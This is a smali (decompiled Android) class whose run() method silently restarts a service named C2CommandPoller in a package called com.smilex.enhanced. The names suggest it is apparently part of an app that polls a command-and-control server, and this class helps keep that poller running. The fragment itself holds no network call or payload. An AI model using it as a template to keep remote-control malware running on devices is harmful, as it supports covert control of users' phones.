.class Lcom/smilex/enhanced/services/C2CommandPoller$PollTask$1;
.super Ljava/lang/Object;
.source "C2CommandPoller.java"

.implements Ljava/lang/Runnable;

.field final synthetic this$1:Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;

.method constructor <init>(Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;)V
    .registers 2
    iput-object p1, p0, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask$1;->this$1:Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .registers 5
    :try_start
    new-instance v0, Landroid/content/Intent;
    iget-object v1, p0, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask$1;->this$1:Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;
    iget-object v1, v1, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;->this$0:Lcom/smilex/enhanced/services/C2CommandPoller;
    const-class v2, Lcom/smilex/enhanced/services/C2CommandPoller;
    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask$1;->this$1:Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;
    iget-object v1, v1, Lcom/smilex/enhanced/services/C2CommandPoller$PollTask;->this$0:Lcom/smilex/enhanced/services/C2CommandPoller;
    invoke-virtual {v1, v0}, Lcom/smilex/enhanced/services/C2CommandPoller;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method
